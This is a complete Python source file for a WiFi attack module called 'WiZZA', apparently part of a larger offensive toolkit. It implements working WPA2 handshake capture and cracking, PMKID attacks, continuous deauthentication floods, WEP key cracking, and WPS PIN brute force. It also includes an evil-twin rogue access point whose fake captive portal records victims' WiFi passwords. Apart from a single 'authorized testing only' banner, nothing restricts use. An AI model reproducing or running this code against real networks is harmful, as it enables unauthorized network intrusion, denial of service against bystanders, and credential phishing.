"""
WiZZA — WiFi Attack Module
op/modules/wifi_attack.py

Techniques:
  1. WPA2 4-way handshake capture + offline crack
  2. PMKID attack (no client deauth needed)
  3. Deauthentication flood (force reconnect / DoS)
  4. WEP cracking (IV collection + aircrack-ng)
  5. Evil twin / rogue AP (hostapd + dnsmasq + credential portal)
  6. WPS PIN brute-force (reaver)
  7. Auto-scan + auto-select attack per network

AUTHORIZED PENETRATION TESTING ONLY
"""

import os
import re
import sys
import time
import signal
import shutil
import subprocess
import threading
from datetime import datetime

# ── Tool checks ───────────────────────────────────────────────────────────────

REQUIRED_TOOLS = {
    "airmon-ng":   "apt install aircrack-ng",
    "airodump-ng": "apt install aircrack-ng",
    "aireplay-ng": "apt install aircrack-ng",
    "aircrack-ng": "apt install aircrack-ng",
    "hcxdumptool": "apt install hcxdumptool",
    "hcxtools":    "apt install hcxtools",
    "hashcat":     "apt install hashcat",
    "hostapd":     "apt install hostapd",
    "dnsmasq":     "apt install dnsmasq",
    "reaver":      "apt install reaver",
    "iwconfig":    "apt install wireless-tools",
}

def _check_tools(*tools):
    missing = [t for t in tools if not shutil.which(t)]
    if missing:
        print(f"[!] Missing tools: {', '.join(missing)}")
        for t in missing:
            if t in REQUIRED_TOOLS:
                print(f"    Install: {REQUIRED_TOOLS[t]}")
        return False
    return True

def _run(cmd, capture=False, timeout=None):
    if capture:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    return subprocess.run(cmd, shell=True)

def _require_root():
    if os.geteuid() != 0:
        print("[!] Root required for WiFi attacks — re-run with sudo")
        sys.exit(1)

# ── Interface helpers ─────────────────────────────────────────────────────────

def list_interfaces():
    """List wireless interfaces."""
    out = _run("iwconfig 2>/dev/null | grep -oP '^\\S+'", capture=True)
    ifaces = [l.strip() for l in out.strip().splitlines() if l.strip()]
    # Filter to wireless only
    wifi = []
    for i in ifaces:
        if "IEEE" in _run(f"iwconfig {i} 2>/dev/null", capture=True):
            wifi.append(i)
    if not wifi:
        # fallback: check /sys/class/net
        for i in os.listdir("/sys/class/net"):
            if os.path.exists(f"/sys/class/net/{i}/wireless"):
                wifi.append(i)
    return wifi


def enable_monitor(iface):
    """Put interface into monitor mode. Returns monitor interface name."""
    _require_root()
    # Kill interfering processes
    _run("airmon-ng check kill 2>/dev/null")
    time.sleep(1)
    out = _run(f"airmon-ng start {iface} 2>&1", capture=True)
    # Parse new interface name (e.g. wlan0mon)
    m = re.search(r'monitor mode (?:enabled|vif enabled) (?:on|for) \[?(\w+)\]?', out)
    if m:
        return m.group(1)
    # Common convention
    if os.path.exists(f"/sys/class/net/{iface}mon"):
        return f"{iface}mon"
    return iface


def disable_monitor(iface):
    """Restore managed mode."""
    _run(f"airmon-ng stop {iface} 2>/dev/null")
    _run("service NetworkManager restart 2>/dev/null || nmcli networking on 2>/dev/null")


# ── Scan for networks ─────────────────────────────────────────────────────────

def scan_networks(iface, duration=15):
    """
    Passive scan — return list of dicts:
      {bssid, channel, encryption, power, essid}
    """
    _require_root()
    if not _check_tools("airodump-ng"):
        return []

    out_prefix = f"/tmp/wizza_scan_{os.getpid()}"
    proc = subprocess.Popen(
        f"airodump-ng --output-format csv --write {out_prefix} {iface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    print(f"[*] Scanning for {duration}s...")
    time.sleep(duration)
    proc.send_signal(signal.SIGINT)
    proc.wait()
    time.sleep(1)

    csv_file = f"{out_prefix}-01.csv"
    networks = []
    if not os.path.exists(csv_file):
        return networks

    with open(csv_file) as f:
        lines = f.readlines()

    # Parse AP section (before "Station MAC" line)
    in_ap = False
    for line in lines:
        line = line.strip()
        if line.startswith("BSSID"):
            in_ap = True
            continue
        if "Station MAC" in line:
            break
        if not in_ap or not line:
            continue
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 14:
            continue
        networks.append({
            "bssid":      parts[0],
            "channel":    parts[3].strip(),
            "encryption": parts[5].strip(),
            "power":      parts[8].strip(),
            "essid":      parts[13].strip(),
        })

    # Cleanup
    for f in [csv_file, f"{out_prefix}-01.kismet.csv", f"{out_prefix}-01.kismet.netxml"]:
        try:
            os.remove(f)
        except FileNotFoundError:
            pass

    return networks


def print_networks(networks):
    print(f"\n  {'#':<4} {'ESSID':<32} {'BSSID':<20} {'CH':<4} {'ENC':<10} {'PWR'}")
    print(f"  {'-'*80}")
    for i, n in enumerate(networks):
        print(f"  [{i}]  {n['essid']:<32} {n['bssid']:<20} {n['channel']:<4} "
              f"{n['encryption']:<10} {n['power']} dBm")
    print()


# ── WPA2 Handshake capture + crack ───────────────────────────────────────────

def capture_handshake(mon_iface, bssid, channel, essid="target",
                      deauth=True, timeout=60, out_dir="/tmp"):
    """
    Capture WPA2 4-way handshake.
    Returns path to .cap file or None.
    """
    _require_root()
    if not _check_tools("airodump-ng", "aireplay-ng"):
        return None

    cap_prefix = os.path.join(out_dir, f"wizza_hs_{bssid.replace(':','')}")
    print(f"[*] Capturing handshake for {essid} ({bssid}) on ch{channel}")

    # Start capture
    cap_proc = subprocess.Popen(
        f"airodump-ng --bssid {bssid} --channel {channel} "
        f"--write {cap_prefix} --output-format pcap {mon_iface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    cap_file = f"{cap_prefix}-01.cap"
    deadline = time.time() + timeout
    found = False

    while time.time() < deadline:
        time.sleep(5)

        # Send deauth burst every 10s to force reconnect
        if deauth and int(time.time()) % 10 < 5:
            subprocess.Popen(
                f"aireplay-ng --deauth 5 -a {bssid} {mon_iface}",
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            ).wait()

        # Check for handshake
        if os.path.exists(cap_file):
            check = _run(
                f"aircrack-ng {cap_file} 2>/dev/null | grep -c 'WPA handshake'",
                capture=True
            ).strip()
            if check and int(check) > 0:
                print(f"[+] Handshake captured: {cap_file}")
                found = True
                break

    cap_proc.send_signal(signal.SIGINT)
    cap_proc.wait()

    if not found:
        print("[-] No handshake captured within timeout")
        return None
    return cap_file


def crack_handshake(cap_file, wordlist="/usr/share/wordlists/rockyou.txt",
                    bssid=None, essid=None, use_hashcat=True):
    """
    Crack WPA2 handshake via aircrack-ng or hashcat (mode 22000).
    Returns cracked password or None.
    """
    if not os.path.exists(cap_file):
        print(f"[!] Cap file not found: {cap_file}")
        return None

    if not os.path.exists(wordlist):
        # Try common locations
        for wl in ["/usr/share/wordlists/rockyou.txt",
                   "/usr/share/wordlists/rockyou.txt.gz",
                   "/opt/wordlists/rockyou.txt"]:
            if os.path.exists(wl):
                wordlist = wl
                break
        else:
            print(f"[!] Wordlist not found. Provide path or: gunzip /usr/share/wordlists/rockyou.txt.gz")
            return None

    # Decompress if needed
    if wordlist.endswith(".gz"):
        dest = wordlist[:-3]
        if not os.path.exists(dest):
            print("[*] Decompressing rockyou.txt...")
            _run(f"gunzip -k {wordlist}")
        wordlist = dest

    if use_hashcat and shutil.which("hcxpcapngtool"):
        # Convert to hashcat 22000 format
        hc_file = cap_file.replace(".cap", ".hc22000")
        _run(f"hcxpcapngtool -o {hc_file} {cap_file} 2>/dev/null")
        if os.path.exists(hc_file) and os.path.getsize(hc_file) > 0:
            print(f"[*] Cracking with hashcat (mode 22000)...")
            pot = hc_file + ".pot"
            _run(f"hashcat -m 22000 {hc_file} {wordlist} --potfile-path {pot} "
                 f"--quiet --status-timer 30")
            if os.path.exists(pot) and os.path.getsize(pot) > 0:
                with open(pot) as f:
                    line = f.readline().strip()
                if ":" in line:
                    pwd = line.split(":")[-1]
                    print(f"[+] PASSWORD FOUND: {pwd}")
                    return pwd

    # Fallback: aircrack-ng
    print(f"[*] Cracking with aircrack-ng (wordlist: {wordlist})...")
    bssid_arg = f"-b {bssid}" if bssid else ""
    out = _run(f"aircrack-ng {bssid_arg} -w {wordlist} {cap_file}", capture=True)
    m = re.search(r'KEY FOUND! \[ (.+?) \]', out)
    if m:
        pwd = m.group(1).strip()
        print(f"[+] PASSWORD FOUND: {pwd}")
        return pwd

    print("[-] Password not in wordlist")
    return None


# ── PMKID attack (no client needed) ──────────────────────────────────────────

def pmkid_attack(mon_iface, bssid=None, duration=60,
                 wordlist="/usr/share/wordlists/rockyou.txt", out_dir="/tmp"):
    """
    PMKID attack via hcxdumptool — captures PMKID from AP beacon without
    requiring a client to be connected. Single-frame attack.
    Returns cracked password or None.
    """
    _require_root()
    if not _check_tools("hcxdumptool", "hashcat"):
        return None

    cap_file = os.path.join(out_dir, f"wizza_pmkid_{os.getpid()}.pcapng")
    hc_file  = cap_file.replace(".pcapng", ".hc22000")

    filter_arg = f"--filterlist_ap={bssid}" if bssid else ""
    print(f"[*] Running PMKID capture for {duration}s...")

    proc = subprocess.Popen(
        f"hcxdumptool -i {mon_iface} {filter_arg} "
        f"--enable_status=1 -o {cap_file}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(duration)
    proc.send_signal(signal.SIGINT)
    proc.wait()

    if not os.path.exists(cap_file) or os.path.getsize(cap_file) == 0:
        print("[-] No PMKID frames captured")
        return None

    # Convert
    hcxtool = shutil.which("hcxpcapngtool") or shutil.which("hcxtools")
    if hcxtool and "hcxpcapngtool" in (hcxtool or ""):
        _run(f"hcxpcapngtool -o {hc_file} {cap_file} 2>/dev/null")
    else:
        _run(f"hcxtools -E /tmp/e -I /tmp/u -U /tmp/u2 {cap_file} 2>/dev/null")
        _run(f"hcxpcapngtool -o {hc_file} {cap_file} 2>/dev/null")

    if not os.path.exists(hc_file) or os.path.getsize(hc_file) == 0:
        print("[-] Conversion failed — no usable PMKID hashes")
        return None

    print(f"[+] PMKID captured → {hc_file}")

    # Decompress wordlist
    if wordlist.endswith(".gz"):
        dest = wordlist[:-3]
        if not os.path.exists(dest):
            _run(f"gunzip -k {wordlist}")
        wordlist = dest

    if not os.path.exists(wordlist):
        print(f"[!] Wordlist not found: {wordlist}")
        print(f"    Run: hashcat -m 22000 {hc_file} <wordlist>")
        return None

    print(f"[*] Cracking PMKID with hashcat...")
    pot = hc_file + ".pot"
    _run(f"hashcat -m 22000 {hc_file} {wordlist} --potfile-path {pot} "
         f"--quiet --status-timer 30")

    if os.path.exists(pot) and os.path.getsize(pot) > 0:
        with open(pot) as f:
            line = f.readline().strip()
        if ":" in line:
            pwd = line.split(":")[-1]
            print(f"[+] PASSWORD FOUND (PMKID): {pwd}")
            return pwd

    print("[-] PMKID hash not cracked by wordlist")
    print(f"    Hash file: {hc_file}  — run: hashcat -m 22000 {hc_file} <wordlist> -r rules/best64.rule")
    return None


# ── Deauthentication flood ────────────────────────────────────────────────────

def deauth(mon_iface, bssid, client_mac=None, count=0, interval=0.1):
    """
    Send deauthentication frames.
    count=0 = continuous until Ctrl+C.
    client_mac=None = broadcast deauth (kicks all clients).
    """
    _require_root()
    if not _check_tools("aireplay-ng"):
        return

    target = f"-c {client_mac}" if client_mac else ""
    burst = 10 if count == 0 else count

    print(f"[*] Deauth flood → {bssid} {'(broadcast)' if not client_mac else client_mac}")
    print("    Ctrl+C to stop" if count == 0 else f"    Sending {count} frames")

    try:
        if count == 0:
            while True:
                _run(f"aireplay-ng --deauth {burst} -a {bssid} {target} {mon_iface}")
                time.sleep(interval)
        else:
            _run(f"aireplay-ng --deauth {burst} -a {bssid} {target} {mon_iface}")
    except KeyboardInterrupt:
        print("\n[*] Deauth stopped")


# ── WEP crack ────────────────────────────────────────────────────────────────

def wep_crack(mon_iface, bssid, channel, out_dir="/tmp"):
    """
    WEP cracking: inject ARP requests to accelerate IV collection,
    then crack with aircrack-ng.
    """
    _require_root()
    if not _check_tools("airodump-ng", "aireplay-ng", "aircrack-ng"):
        return None

    cap_prefix = os.path.join(out_dir, f"wizza_wep_{bssid.replace(':','')}")
    print(f"[*] Starting WEP attack on {bssid} ch{channel}")

    # Start capture
    cap_proc = subprocess.Popen(
        f"airodump-ng --bssid {bssid} --channel {channel} "
        f"--write {cap_prefix} --output-format pcap {mon_iface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(3)

    # Fake auth
    _run(f"aireplay-ng --fakeauth 0 -e target -a {bssid} {mon_iface} &",
         capture=True)
    time.sleep(2)

    # ARP replay to generate IVs
    arpreplay = subprocess.Popen(
        f"aireplay-ng --arpreplay -b {bssid} {mon_iface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    cap_file = f"{cap_prefix}-01.cap"
    print("[*] Collecting IVs (need ~20k–40k)... Ctrl+C to attempt crack now")

    try:
        while True:
            time.sleep(10)
            # Try crack every 10s
            out = _run(f"aircrack-ng -b {bssid} {cap_file} 2>/dev/null", capture=True)
            m = re.search(r'KEY FOUND! \[ (.+?) \]', out)
            if m:
                key = m.group(1).strip()
                print(f"[+] WEP KEY FOUND: {key}")
                cap_proc.send_signal(signal.SIGINT)
                arpreplay.send_signal(signal.SIGINT)
                return key
            # IV count
            iv_m = re.search(r'(\d+) IVs', out)
            if iv_m:
                print(f"    IVs collected: {iv_m.group(1)}")
    except KeyboardInterrupt:
        print("\n[*] Attempting crack with collected IVs...")
        out = _run(f"aircrack-ng -b {bssid} {cap_file}", capture=True)
        m = re.search(r'KEY FOUND! \[ (.+?) \]', out)
        if m:
            key = m.group(1).strip()
            print(f"[+] WEP KEY FOUND: {key}")
            return key
        print("[-] Not enough IVs yet")
        return None
    finally:
        try:
            cap_proc.send_signal(signal.SIGINT)
            arpreplay.send_signal(signal.SIGINT)
        except Exception:
            pass


# ── WPS brute-force ───────────────────────────────────────────────────────────

def wps_attack(iface, bssid, channel, out_dir="/tmp"):
    """
    WPS PIN brute-force via reaver.
    Works against APs with WPS enabled (and not locked).
    """
    _require_root()
    if not _check_tools("reaver"):
        return None

    log_file = os.path.join(out_dir, f"wizza_wps_{bssid.replace(':','')}.log")
    print(f"[*] WPS brute-force on {bssid} ch{channel}")
    print(f"    Log: {log_file}")
    print("    Ctrl+C to stop (reaver auto-saves progress)")

    cmd = (f"reaver -i {iface} -b {bssid} -c {channel} "
           f"-vv -K 1 -N 2>&1 | tee {log_file}")
    try:
        _run(cmd)
    except KeyboardInterrupt:
        print("\n[*] WPS attack paused — re-run to resume from saved session")

    # Parse result
    if os.path.exists(log_file):
        with open(log_file) as f:
            content = f.read()
        m = re.search(r'WPA PSK: (.+)', content)
        if m:
            psk = m.group(1).strip()
            print(f"[+] WPS PIN cracked — WPA PSK: {psk}")
            return psk
    return None


# ── Evil Twin / Rogue AP ──────────────────────────────────────────────────────

HOSTAPD_CONF = """
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""

DNSMASQ_CONF = """
interface={iface}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1
"""

CAPTIVE_PORTAL_HTML = """<!DOCTYPE html>
<html>
<head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WiFi Login</title>
<style>
  body {{ font-family: Arial; background: #f0f0f0; display:flex;
         justify-content:center; align-items:center; height:100vh; margin:0; }}
  .box {{ background: white; padding: 40px; border-radius: 8px;
          box-shadow: 0 2px 10px rgba(0,0,0,.2); width:320px; }}
  h2 {{ margin-top:0; color:#333; }}
  input {{ width:100%; padding:10px; margin:8px 0; box-sizing:border-box;
           border:1px solid #ccc; border-radius:4px; font-size:14px; }}
  button {{ width:100%; padding:12px; background:#0078d4; color:white;
             border:none; border-radius:4px; font-size:16px; cursor:pointer; }}
  button:hover {{ background:#006cbd; }}
  .note {{ font-size:12px; color:#888; margin-top:10px; }}
</style>
</head>
<body>
<div class="box">
  <h2>WiFi Authentication</h2>
  <p style="color:#555;font-size:14px">Enter the network password to continue.</p>
  <form method="POST" action="/login">
    <input type="text"     name="ssid"     placeholder="Network name" value="{ssid}">
    <input type="password" name="password" placeholder="WiFi password" autocomplete="off">
    <button type="submit">Connect</button>
  </form>
  <div class="note">You will be redirected after authentication.</div>
</div>
</body>
</html>"""

def evil_twin(ap_iface, mon_iface, ssid, channel=6, out_dir="/tmp"):
    """
    Evil twin rogue AP:
      - hostapd open AP with cloned SSID
      - dnsmasq DHCP + DNS sinkhole
      - HTTP captive portal captures WiFi password submission
    Requires two wireless interfaces (one for AP, one for monitor/deauth).
    """
    _require_root()
    if not _check_tools("hostapd", "dnsmasq"):
        return

    creds_file = os.path.join(out_dir, "wizza_evil_twin_creds.txt")

    # Write configs
    hostapd_conf = "/tmp/wizza_hostapd.conf"
    dnsmasq_conf = "/tmp/wizza_dnsmasq.conf"

    with open(hostapd_conf, "w") as f:
        f.write(HOSTAPD_CONF.format(iface=ap_iface, ssid=ssid, channel=channel))

    with open(dnsmasq_conf, "w") as f:
        f.write(DNSMASQ_CONF.format(iface=ap_iface))

    # Configure AP interface
    _run(f"ip link set {ap_iface} up")
    _run(f"ip addr add 10.0.0.1/24 dev {ap_iface} 2>/dev/null || true")
    _run(f"sysctl -w net.ipv4.ip_forward=1 > /dev/null")

    # Start hostapd and dnsmasq
    print(f"[*] Starting evil twin AP: SSID='{ssid}' ch{channel}")
    hostapd_proc = subprocess.Popen(
        f"hostapd {hostapd_conf}", shell=True,
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(2)

    dnsmasq_proc = subprocess.Popen(
        f"dnsmasq -C {dnsmasq_conf} --no-daemon",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    # Start deauth on legitimate AP via monitor interface
    if mon_iface:
        print(f"[*] Deauthing clients from legitimate AP via {mon_iface}")
        deauth_proc = subprocess.Popen(
            f"aireplay-ng --deauth 0 -e '{ssid}' {mon_iface}",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    else:
        deauth_proc = None

    # HTTP captive portal
    import http.server
    import urllib.parse

    portal_html = CAPTIVE_PORTAL_HTML.format(ssid=ssid)

    class PortalHandler(http.server.BaseHTTPRequestHandler):
        def log_message(self, fmt, *args):
            pass  # suppress default log

        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(portal_html.encode())

        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode()
            params = urllib.parse.parse_qs(body)
            password = params.get("password", [""])[0]
            captured_ssid = params.get("ssid", [ssid])[0]
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            entry = f"[{ts}] CLIENT: {self.client_address[0]}  SSID: {captured_ssid}  PASS: {password}\n"
            print(f"[+] CREDENTIAL CAPTURED: {entry.strip()}")
            with open(creds_file, "a") as f:
                f.write(entry)
            # Redirect to success page
            self.send_response(302)
            self.send_header("Location", "http://connectivitycheck.gstatic.com/generate_204")
            self.end_headers()

    # Redirect all HTTP to portal
    _run("iptables -t nat -A PREROUTING -i " + ap_iface +
         " -p tcp --dport 80 -j REDIRECT --to-port 8180 2>/dev/null")
    _run("iptables -t nat -A PREROUTING -i " + ap_iface +
         " -p tcp --dport 443 -j REDIRECT --to-port 8180 2>/dev/null")

    server = http.server.HTTPServer(("10.0.0.1", 8180), PortalHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()

    print(f"[+] Evil twin running — credentials → {creds_file}")
    print("    Ctrl+C to stop")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Stopping evil twin...")
    finally:
        server.shutdown()
        hostapd_proc.terminate()
        dnsmasq_proc.terminate()
        if deauth_proc:
            deauth_proc.terminate()
        _run("iptables -t nat -F 2>/dev/null")
        _run(f"ip addr del 10.0.0.1/24 dev {ap_iface} 2>/dev/null || true")
        print(f"[*] Credentials saved: {creds_file}")


# ── Auto-attack (scan + choose best method) ───────────────────────────────────

def auto_attack(iface, wordlist="/usr/share/wordlists/rockyou.txt",
                duration=15, out_dir="/tmp"):
    """
    Full auto-attack:
      1. Put iface in monitor mode
      2. Scan networks
      3. Present menu
      4. Choose PMKID (preferred) or handshake capture based on WPA2
         WEP if WEP, WPS brute if WPS
    """
    _require_root()
    if not _check_tools("airmon-ng", "airodump-ng", "aircrack-ng"):
        return

    print(f"[*] Enabling monitor mode on {iface}...")
    mon = enable_monitor(iface)
    print(f"[+] Monitor interface: {mon}")

    try:
        networks = scan_networks(mon, duration=duration)
        if not networks:
            print("[-] No networks found")
            return

        print_networks(networks)
        idx = int(input("Select network [#]: ").strip())
        net = networks[idx]

        bssid   = net["bssid"]
        channel = net["channel"]
        essid   = net["essid"]
        enc     = net["encryption"].upper()

        print(f"\n[*] Target: {essid}  BSSID: {bssid}  CH: {channel}  ENC: {enc}")

        if "WEP" in enc:
            wep_crack(mon, bssid, channel, out_dir)

        elif "WPA" in enc:
            # Try PMKID first (no deauth needed)
            if shutil.which("hcxdumptool"):
                print("[*] Trying PMKID attack first (no deauth)...")
                result = pmkid_attack(mon, bssid=bssid, duration=45,
                                      wordlist=wordlist, out_dir=out_dir)
                if result:
                    return
                print("[*] PMKID not available — falling back to handshake capture")

            # Handshake capture with deauth
            cap = capture_handshake(mon, bssid, channel, essid=essid,
                                    deauth=True, timeout=90, out_dir=out_dir)
            if cap:
                crack_handshake(cap, wordlist=wordlist, bssid=bssid)

        else:
            print(f"[!] Unknown encryption: {enc} — trying WPA handshake")
            cap = capture_handshake(mon, bssid, channel, essid=essid,
                                    deauth=True, out_dir=out_dir)
            if cap:
                crack_handshake(cap, wordlist=wordlist)

    finally:
        disable_monitor(mon)


# ── Module entry point ────────────────────────────────────────────────────────

def run(action, **kwargs):
    actions = {
        "auto":      auto_attack,
        "scan":      scan_networks,
        "handshake": capture_handshake,
        "crack":     crack_handshake,
        "pmkid":     pmkid_attack,
        "deauth":    deauth,
        "wep":       wep_crack,
        "wps":       wps_attack,
        "evil_twin": evil_twin,
    }
    if action not in actions:
        print(f"[!] Unknown action: {action}")
        print(f"    Available: {', '.join(actions)}")
        return
    return actions[action](**kwargs)


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="WiZZA WiFi Attack Module")
    p.add_argument("action", choices=[
        "auto", "scan", "handshake", "crack",
        "pmkid", "deauth", "wep", "wps", "evil_twin"
    ])
    p.add_argument("-i", "--iface",   default="wlan0")
    p.add_argument("-b", "--bssid",   default=None)
    p.add_argument("-c", "--channel", default="6")
    p.add_argument("-e", "--essid",   default="target")
    p.add_argument("-w", "--wordlist",
                   default="/usr/share/wordlists/rockyou.txt")
    p.add_argument("-f", "--cap",     default=None, help="existing .cap file")
    p.add_argument("-o", "--out",     default="/tmp")
    p.add_argument("-d", "--duration", type=int, default=15)
    args = p.parse_args()

    if args.action == "auto":
        auto_attack(args.iface, wordlist=args.wordlist,
                    duration=args.duration, out_dir=args.out)
    elif args.action == "scan":
        nets = scan_networks(args.iface, duration=args.duration)
        print_networks(nets)
    elif args.action == "handshake":
        capture_handshake(args.iface, args.bssid, args.channel,
                          essid=args.essid, out_dir=args.out)
    elif args.action == "crack":
        crack_handshake(args.cap or f"{args.out}/wizza_hs_{args.bssid}.cap",
                        wordlist=args.wordlist, bssid=args.bssid)
    elif args.action == "pmkid":
        # Enable monitor mode if interface is not already in monitor mode
        _mon = args.iface
        iw_out = subprocess.getoutput(f"iw dev {args.iface} info 2>/dev/null")
        if "type monitor" not in iw_out:
            print(f"[*] Enabling monitor mode on {args.iface}...")
            _mon = enable_monitor(args.iface)
            if not _mon:
                print(f"[!] Failed to enable monitor mode on {args.iface}")
                sys.exit(1)
        try:
            pmkid_attack(_mon, bssid=args.bssid,
                         duration=args.duration, wordlist=args.wordlist)
        finally:
            if _mon != args.iface:
                disable_monitor(_mon)
    elif args.action == "deauth":
        _mon = args.iface
        iw_out = subprocess.getoutput(f"iw dev {args.iface} info 2>/dev/null")
        if "type monitor" not in iw_out:
            _mon = enable_monitor(args.iface)
        try:
            deauth(_mon, args.bssid)
        finally:
            if _mon != args.iface:
                disable_monitor(_mon)
    elif args.action == "wep":
        wep_crack(args.iface, args.bssid, args.channel)
    elif args.action == "wps":
        wps_attack(args.iface, args.bssid, args.channel)
    elif args.action == "evil_twin":
        evil_twin(args.iface, None, args.essid, int(args.channel))
